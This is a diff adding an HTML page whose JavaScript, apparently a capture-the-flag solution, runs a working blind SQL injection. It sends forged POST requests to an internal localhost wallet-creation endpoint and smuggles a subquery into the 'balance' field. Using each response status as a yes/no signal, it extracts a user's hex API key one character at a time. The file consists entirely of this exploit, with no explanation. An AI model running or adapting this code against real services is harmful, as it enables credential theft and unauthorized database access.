@@ -1,0 +1,49 @@
+<span style="color: green;" id="goodChars" name="goodChars"></span>
+<br>
+<span style="color: red;" id="badChars" name="badChars"></span>
+<br>
+<span style="color: indigo;" id="errorOut" name="errorOut"></span>
+<script>
+try {
+	var ALPHABET = '0123456789abcdef';
+	var PREFIX = "__TOKEN__";
+
+	function judgeChar(xhr, candidate, prefix) {
+		if (xhr.readyState !== 4)
+			return;
+
+		// Old one arrived - discard
+		if (goodChars.innerText.length > prefix.length)
+			return;
+
+		if (xhr.status != 200) {
+			badChars.innerText += candidate;
+			return;
+		}
+
+		goodChars.innerText += candidate;
+		badChars.innerText = '';
+
+		prefix = goodChars.innerText;
+		for (var i = 0; i < ALPHABET.length; i++)
+			testChar(ALPHABET.charAt(i), prefix);
+	}
+
+	function testChar(candidate, prefix) {
+		var xhr = new XMLHttpRequest();
+		xhr.open('POST', 'http://localhost:1337/internal/createTestWallet', true);
+		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+		xhr.onreadystatechange = function () {judgeChar(xhr, candidate, prefix)};
+		xhr.send('balance=' + encodeURIComponent(
+			"(SELECT 1337 FROM general AS g WHERE g.api_key LIKE '" +
+			prefix + candidate +
+			"%' AND g.user_id = '13371337-1337-1337-1337-133713371337'),'test');-- "));
+	}
+
+	goodChars.innerText = PREFIX;
+	for (var i = 0; i < ALPHABET.length; i++)
+		testChar(ALPHABET.charAt(i), PREFIX);
+} catch(e) {
+	errorOut.innerText = e;
+}
+</script>
